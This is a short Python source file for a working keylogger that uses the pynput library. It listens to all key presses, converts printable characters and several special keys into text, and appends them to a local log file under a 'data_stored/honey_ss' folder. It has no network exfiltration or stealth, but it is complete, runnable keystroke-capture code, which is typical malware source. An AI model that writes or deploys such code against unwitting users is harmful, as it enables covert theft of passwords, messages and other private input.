from pynput import keyboard
import os
import sys
import signal

should_stop = False
listener = None

def write_file(char):
    LOG_DIR = os.path.join(os.path.dirname(__file__), "data_stored", "honey_ss")
    os.makedirs(LOG_DIR, exist_ok=True)
    with open(os.path.join(LOG_DIR, 'log.txt'), "a", encoding="utf-8") as f:
        f.write(char)
        f.flush()

class KeyloggerMain:
    def __init__(self):
        self.pressed_keys = set()

    def on_press(self, key):
        global should_stop
        if should_stop:
            return False

        key_id = self._key_id(key)
        if key_id in self.pressed_keys:
            return True  # Ignore repeats while held
        self.pressed_keys.add(key_id)

        char = self._key_to_char(key)
        if char is not None:
            write_file(char)
        return True

    def on_release(self, key):
        global should_stop
        key_id = self._key_id(key)
        self.pressed_keys.discard(key_id)
        if should_stop:
            return False

    def _key_id(self, key):
        # Use key.vk for KeyCode, or str(key) for special keys
        if hasattr(key, 'vk'):
            return ('vk', key.vk)
        else:
            return ('key', str(key))

    def _key_to_char(self, key):
        if isinstance(key, keyboard.KeyCode) and key.char and key.char.isprintable():
            return key.char
        elif key == keyboard.Key.space:
            return ' '
        elif key == keyboard.Key.enter:
            return '\n'
        elif key == keyboard.Key.tab:
            return '\t'
        elif key == keyboard.Key.backspace:
            return '<bs>'
        return None

    def run(self):
        global listener
        listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        )
        listener.start()
        listener.join()

def cleanup():
    global listener, should_stop
    should_stop = True
    if listener:
        listener.stop()
    sys.exit(0)

def signal_handler(sig, frame):
    cleanup()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    km = KeyloggerMain()
    km.run()